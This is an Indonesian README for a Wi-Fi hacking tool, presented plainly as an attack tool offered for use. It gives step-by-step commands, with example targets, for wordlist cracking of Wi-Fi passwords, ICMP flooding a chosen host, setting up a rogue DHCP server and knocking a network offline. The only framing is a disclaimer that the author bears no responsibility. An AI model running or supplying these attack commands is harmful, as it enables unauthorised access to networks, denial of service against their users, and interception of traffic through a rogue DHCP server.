# WifiLanhacktools BETA Version

Sebuah tool simpel untuk hack jaringan Wi-Fi

Tersedia untuk:
- WiFi password crack
- ICMP Flood
- DHCP rogue
- DOS attack

[!]Install requirement-nya terlebih dahulu dengan mengetik "pip3 install -r requirements.txt".

Cara pakai:
1. Cara melakukan serangan crack password Wifi
   Serangan ini bertujuan untuk mencocokan password wifi berdasarkan list yang tersedia di wordlist. jika password cocok maka otomatis akan tersambung ke jaringan Wifi tersebut.
   
   [*]Cara Pakai:
   - Ketik "python run.py --c scan_wifi_lists" untuk scan jaringan Wifi tersedia.
   - Siapkan Password lists berformat .txt untuk mencocokan Password.
   - Untuk melakukan serangan ketik "python run.py --c crack_wifi_password --s [SSID_WIFI] --w [WORDLIST PASSWORD]" (contoh:python run.py --c crack_wifi_password --s "Target Wifi" --w pass.txt)
   - Tunggu sampai selesai.

   [!]Note:
   + Jika SSID memiliki spasi tambahkan huruf petik seperti contoh diatas.
   + Tekan Ctrl + C untuk berhenti.

3. Cara melakukan serangan ICMP Flood
   Serangan ini bertujuan untuk membanjiri target dengan sejumlah paket ICMP untuk menghambat lalu lintas internet pada target tersebut.
   
   [*]Cara Pakai:
   - Ketik "python run.py --c scan_ip --g [IP_GATEWAY/24]" untuk scan IP Address tersedia.
   - Pilih target IP Address untuk menjadi target.
   - Untuk melakukan serangan ketik "python run.py --c icmp_attack --ip [IP_TARGET] --loop [JUMLAH_LOOP]" (contoh:python run.py --c icmp_attack --ip 192.168.1.10 --loop 10000)
   - Tunggu sampai selesai.

   [!]Note:
   + Tekan Ctrl + C untuk berhenti.
     
5. Cara melakukan serangan DHCP Rogue
   DHCP Rogue ini bertujuan untuk menjadi DHCP Server kedua. jadi jika melakukan serangan ini otomatis PC ini menjadi DHCP server.
   
   [*]Cara Pakai:
   - Ketik "python run.py --c dhcp_rogue --ip [IP_ATTACKER] --g [GATEWAY] --d [IP_DNS] --sub [SUBNET_MASK] --lt [LEASE_TIME]" untuk melakukan serangan (contoh: python run.py --c dhcp_rogue --ip 192.168.1.2 --g 192.168.1.1 --d 192.168.1.1 --sub 255.255.255.0 --lt 43200).

   [!]Note:
   + Tekan Ctrl + C untuk berhenti.
  
7. Cara melakukan serangan DOS Attack
   Serangan ini bertujuan untuk mematikan akses internet pada jaringan Wifi.
   
   [*]Cara Pakai:
   - Ketik "python run.py --c stop_internet --g [GATEWAY] --i [INTERFACE] --g [GATEWAY] --i [INTERFACE] --p [IP_3_DIGIT_PERTAMA.255]" untuk melakukan serangan (contoh: python run.py --c stop_internet --g 192.168.1.1 --i wlp2s0 --p 192.168.1.255).

   [!]Note:
   + Tekan Ctrl + C untuk berhenti.

[!]Peringatan:
Pembuat tools tidak bertanggung jawab jika terjadi apa-apa. Gunakan tools ini dengan hati-hati.
 
